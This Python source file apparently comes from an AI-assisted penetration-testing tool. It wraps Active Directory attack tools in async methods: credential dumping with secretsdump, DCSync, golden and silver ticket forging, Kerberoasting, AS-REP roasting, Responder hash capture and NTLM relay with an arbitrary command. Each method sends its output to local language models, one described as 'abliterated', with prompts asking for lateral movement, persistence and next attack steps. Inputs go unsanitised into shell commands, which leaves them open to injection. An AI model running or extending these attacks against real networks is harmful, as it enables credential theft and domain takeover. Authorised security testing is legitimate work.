import asyncio
import aiohttp
import json
from typing import Dict, List, Optional
from .kali_executor import kali_executor

class NetworkToolsService:
    """Advanced network penetration testing and AD exploitation"""
    
    def __init__(self):
        self.ollama_url = "http://localhost:11434/api/generate"
        self.models = {
            "code": "qwen2.5-coder:7b-instruct",
            "analysis": "deepseek-coder:6.7b-instruct",
            "advanced": "huihui_ai/glm-4.7-flash-abliterated:q4_K"
        }
    
    async def analyze_with_ai(self, prompt: str, model_key: str = "code") -> str:
        """Query Ollama model"""
        try:
            async with aiohttp.ClientSession() as session:
                payload = {"model": self.models[model_key], "prompt": prompt, "stream": False}
                async with session.post(self.ollama_url, json=payload) as resp:
                    result = await resp.json()
                    return result.get("response", "")
        except:
            return ""
    
    async def bloodhound_collect(self, domain: str, username: str, password: str) -> Dict:
        """Collect AD data with BloodHound"""
        cmd = f"bloodhound-python -d {domain} -u {username} -p '{password}' -c all -ns {domain}"
        result = await kali_executor.execute_command(cmd)
        
        if result["success"]:
            ai_analysis = await self.analyze_with_ai(
                f"Analyze BloodHound AD enumeration and identify attack paths:\n{result['output'][:4000]}",
                "advanced"
            )
            result["ai_insights"] = ai_analysis
        
        return result
    
    async def bloodhound_analyze_paths(self, json_data: str) -> Dict:
        """Analyze BloodHound JSON for attack paths"""
        try:
            data = json.loads(json_data)
            
            ai_analysis = await self.analyze_with_ai(
                f"Analyze Active Directory attack paths and prioritize exploitation routes:\n{json.dumps(data, indent=2)[:4000]}",
                "advanced"
            )
            
            return {
                "success": True,
                "data": data,
                "ai_insights": ai_analysis
            }
        except Exception as e:
            return {"success": False, "error": str(e)}
    
    async def mimikatz_dump_creds(self, target: str, username: str, password: str) -> Dict:
        """Execute Mimikatz via Impacket"""
        cmd = f"impacket-secretsdump {username}:'{password}'@{target}"
        result = await kali_executor.execute_command(cmd)
        
        if result["success"]:
            ai_analysis = await self.analyze_with_ai(
                f"Analyze dumped credentials and suggest lateral movement strategies:\n{result['output'][:4000]}",
                "advanced"
            )
            result["ai_insights"] = ai_analysis
        
        return result
    
    async def mimikatz_golden_ticket(self, domain: str, sid: str, krbtgt_hash: str) -> Dict:
        """Generate golden ticket attack"""
        cmd = f"impacket-ticketer -nthash {krbtgt_hash} -domain-sid {sid} -domain {domain} Administrator"
        result = await kali_executor.execute_command(cmd)
        
        if result["success"]:
            ai_analysis = await self.analyze_with_ai(
                f"Analyze golden ticket attack success and persistence methods:\n{result['output'][:4000]}",
                "analysis"
            )
            result["ai_insights"] = ai_analysis
        
        return result
    
    async def responder_capture(self, interface: str = "eth0", duration: int = 60) -> Dict:
        """Capture NTLM hashes with Responder"""
        cmd = f"timeout {duration} responder -I {interface} -wrf"
        result = await kali_executor.execute_command(cmd)
        
        if result["success"]:
            ai_analysis = await self.analyze_with_ai(
                f"Analyze captured NTLM hashes and suggest cracking strategy:\n{result['output'][:4000]}",
                "code"
            )
            result["ai_insights"] = ai_analysis
        
        return result
    
    async def crackmapexec_scan(self, target: str, username: str = None, password: str = None) -> Dict:
        """SMB enumeration with CrackMapExec"""
        if username and password:
            cmd = f"crackmapexec smb {target} -u {username} -p '{password}' --shares --users --groups"
        else:
            cmd = f"crackmapexec smb {target} --shares"
        
        result = await kali_executor.execute_command(cmd)
        
        if result["success"]:
            ai_analysis = await self.analyze_with_ai(
                f"Analyze SMB enumeration results and identify misconfigurations:\n{result['output'][:4000]}",
                "analysis"
            )
            result["ai_insights"] = ai_analysis
        
        return result
    
    async def openvas_scan(self, target: str) -> Dict:
        """Vulnerability scan with OpenVAS"""
        # Create target and task
        cmd = f"""
        omp -u admin -w admin --xml='<create_target><name>scan_{target}</name><hosts>{target}</hosts></create_target>' && \
        omp -u admin -w admin --xml='<create_task><name>scan_{target}</name><target id="TARGET_ID"/><config id="daba56c8-73ec-11df-a475-002264764cea"/></create_task>' && \
        omp -u admin -w admin --xml='<start_task task_id="TASK_ID"/>'
        """
        result = await kali_executor.execute_command(cmd)
        
        if result["success"]:
            ai_analysis = await self.analyze_with_ai(
                f"Analyze vulnerability scan results and prioritize remediation:\n{result['output'][:4000]}",
                "advanced"
            )
            result["ai_insights"] = ai_analysis
        
        return result
    
    async def nmap_vuln_scan(self, target: str) -> Dict:
        """Nmap vulnerability scanning"""
        cmd = f"nmap -sV --script vuln {target}"
        result = await kali_executor.execute_command(cmd)
        
        if result["success"]:
            ai_analysis = await self.analyze_with_ai(
                f"Analyze Nmap vulnerability scan and suggest exploitation:\n{result['output'][:4000]}",
                "code"
            )
            result["ai_insights"] = ai_analysis
        
        return result
    
    async def kerbrute_enum(self, domain: str, userlist: str = "/usr/share/wordlists/seclists/Usernames/Names/names.txt") -> Dict:
        """Kerberos user enumeration"""
        cmd = f"kerbrute userenum --dc {domain} -d {domain} {userlist}"
        result = await kali_executor.execute_command(cmd)
        
        if result["success"]:
            ai_analysis = await self.analyze_with_ai(
                f"Analyze enumerated users and suggest password spray strategy:\n{result['output'][:4000]}",
                "analysis"
            )
            result["ai_insights"] = ai_analysis
        
        return result
    
    async def kerberoast_attack(self, domain: str, username: str, password: str) -> Dict:
        """Kerberoasting attack"""
        cmd = f"impacket-GetUserSPNs {domain}/{username}:'{password}' -request -dc-ip {domain}"
        result = await kali_executor.execute_command(cmd)
        
        if result["success"]:
            ai_analysis = await self.analyze_with_ai(
                f"Analyze Kerberoast hashes and suggest cracking approach:\n{result['output'][:4000]}",
                "code"
            )
            result["ai_insights"] = ai_analysis
        
        return result
    
    async def asreproast_attack(self, domain: str, userlist: str) -> Dict:
        """AS-REP Roasting attack"""
        cmd = f"impacket-GetNPUsers {domain}/ -usersfile {userlist} -dc-ip {domain}"
        result = await kali_executor.execute_command(cmd)
        
        if result["success"]:
            ai_analysis = await self.analyze_with_ai(
                f"Analyze AS-REP roast results:\n{result['output'][:4000]}",
                "analysis"
            )
            result["ai_insights"] = ai_analysis
        
        return result
    
    async def zerologon_check(self, target: str, dc_name: str) -> Dict:
        """Check for Zerologon vulnerability"""
        cmd = f"python3 /opt/zerologon/zerologon_tester.py {dc_name} {target}"
        result = await kali_executor.execute_command(cmd)
        
        if result["success"]:
            ai_analysis = await self.analyze_with_ai(
                f"Analyze Zerologon vulnerability status:\n{result['output'][:4000]}",
                "advanced"
            )
            result["ai_insights"] = ai_analysis
        
        return result
    
    async def dcsync_attack(self, domain: str, username: str, password: str, target_user: str = "Administrator") -> Dict:
        """DCSync attack to extract password hashes"""
        cmd = f"impacket-secretsdump -just-dc-user {target_user} {domain}/{username}:'{password}'@{domain}"
        result = await kali_executor.execute_command(cmd)
        
        if result["success"]:
            ai_analysis = await self.analyze_with_ai(
                f"Analyze DCSync results and suggest next attack steps:\n{result['output'][:4000]}",
                "advanced"
            )
            result["ai_insights"] = ai_analysis
        
        return result
    
    async def silver_ticket(self, domain: str, sid: str, service_hash: str, service: str, target: str) -> Dict:
        """Generate silver ticket for specific service"""
        cmd = f"impacket-ticketer -nthash {service_hash} -domain-sid {sid} -domain {domain} -spn {service}/{target} Administrator"
        result = await kali_executor.execute_command(cmd)
        
        if result["success"]:
            ai_analysis = await self.analyze_with_ai(
                f"Analyze silver ticket generation and suggest persistence methods:\n{result['output'][:4000]}",
                "analysis"
            )
            result["ai_insights"] = ai_analysis
        
        return result
    
    async def ntlm_relay(self, target: str, command: str = None) -> Dict:
        """NTLM relay attack"""
        cmd_opt = f"-c '{command}'" if command else ""
        cmd = f"impacket-ntlmrelayx -t {target} {cmd_opt} -smb2support"
        result = await kali_executor.execute_command(cmd)
        
        if result["success"]:
            ai_analysis = await self.analyze_with_ai(
                f"Analyze NTLM relay attack results:\n{result['output'][:4000]}",
                "code"
            )
            result["ai_insights"] = ai_analysis
        
        return result
    
    async def ldap_enumeration(self, domain: str, username: str, password: str) -> Dict:
        """Deep LDAP enumeration"""
        cmd = f"ldapsearch -x -H ldap://{domain} -D '{username}@{domain}' -w '{password}' -b 'DC={domain.split('.')[0]},DC={domain.split('.')[1]}' '(objectClass=*)'"
        result = await kali_executor.execute_command(cmd)
        
        if result["success"]:
            ai_analysis = await self.analyze_with_ai(
                f"Analyze LDAP enumeration and identify high-value targets:\n{result['output'][:4000]}",
                "advanced"
            )
            result["ai_insights"] = ai_analysis
        
        return result
    
    async def gpp_abuse(self, domain: str, username: str, password: str) -> Dict:
        """Group Policy Preferences password extraction"""
        cmd = f"impacket-Get-GPPPassword {domain}/{username}:'{password}'@{domain}"
        result = await kali_executor.execute_command(cmd)
        
        if result["success"]:
            ai_analysis = await self.analyze_with_ai(
                f"Analyze GPP passwords found:\n{result['output'][:4000]}",
                "analysis"
            )
            result["ai_insights"] = ai_analysis
        
        return result
    
    async def constrained_delegation(self, domain: str, username: str, password: str) -> Dict:
        """Find constrained delegation misconfigurations"""
        cmd = f"impacket-findDelegation {domain}/{username}:'{password}'@{domain}"
        result = await kali_executor.execute_command(cmd)
        
        if result["success"]:
            ai_analysis = await self.analyze_with_ai(
                f"Analyze delegation misconfigurations and exploitation paths:\n{result['output'][:4000]}",
                "advanced"
            )
            result["ai_insights"] = ai_analysis
        
        return result
    
    async def printnightmare_check(self, target: str) -> Dict:
        """Check for PrintNightmare vulnerability"""
        cmd = f"rpcdump.py {target} | grep -i 'MS-RPRN'"
        result = await kali_executor.execute_command(cmd)
        
        if result["success"]:
            ai_analysis = await self.analyze_with_ai(
                f"Analyze PrintNightmare vulnerability status:\n{result['output'][:4000]}",
                "code"
            )
            result["ai_insights"] = ai_analysis
        
        return result
    
    async def full_ad_assessment(self, domain: str, username: str, password: str) -> Dict:
        """Comprehensive Active Directory assessment"""
        results = {
            "domain": domain,
            "assessments": {}
        }
        
        # Run assessments in parallel
        tasks = {
            "bloodhound": self.bloodhound_collect(domain, username, password),
            "crackmapexec": self.crackmapexec_scan(domain, username, password),
            "kerberoast": self.kerberoast_attack(domain, username, password),
            "mimikatz": self.mimikatz_dump_creds(domain, username, password)
        }
        
        completed = await asyncio.gather(*tasks.values(), return_exceptions=True)
        
        for key, result in zip(tasks.keys(), completed):
            if not isinstance(result, Exception):
                results["assessments"][key] = result
        
        # Generate attack strategy
        summary = "\n\n".join([
            f"{k}: {str(v)[:500]}" 
            for k, v in results["assessments"].items()
        ])
        
        attack_strategy = await self.analyze_with_ai(
            f"Generate comprehensive AD penetration testing report with attack paths:\n{summary}",
            "advanced"
        )
        
        results["attack_strategy"] = attack_strategy
        return results

network_tools_service = NetworkToolsService()
